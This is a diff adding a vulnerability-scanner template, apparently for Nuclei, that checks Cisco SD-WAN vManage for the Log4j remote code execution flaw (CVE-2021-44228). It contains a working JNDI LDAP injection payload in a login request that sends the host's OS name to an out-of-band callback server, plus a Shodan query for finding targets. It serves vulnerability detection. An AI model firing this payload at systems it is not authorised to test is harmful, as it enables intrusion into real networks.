@@ -1,0 +1,59 @@
+id: cisco-vmanage-log4j
+info:
+  author: DhiyaneshDK
+  description: Cisco SD-WAN vManage is affected by the following critical vulnerability
+    in the Apache Log4j Java logging library as described in the cisco-sa-apache-log4j-qRuKNEbd
+    advisory
+  metadata:
+    shodan-query: title:"vManage"
+    verified: true
+  name: Cisco vManage - Remote Code Execution (Apache Log4j)
+  reference:
+  - https://www.tenable.com/plugins/nessus/161212
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  severity: critical
+  tags: log4j,cisco,tenable,cve,cve2021,rce,jndi
+requests:
+- extractors:
+  - kval:
+    - interactsh_ip
+    type: kval
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9.-]+).([a-z0-9]+).([a-z0-9]+).\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'POST /j_security_check HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+    Accept-Language: en-US,en;q=0.5
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Origin: {{BaseURL}}
+
+    Referer: {{BaseURL}}
+
+
+    j_username=${jndi:ldap://${sys:os.name}.{{interactsh-url}}}&j_password=admin&submit=Log+In
+
+    '
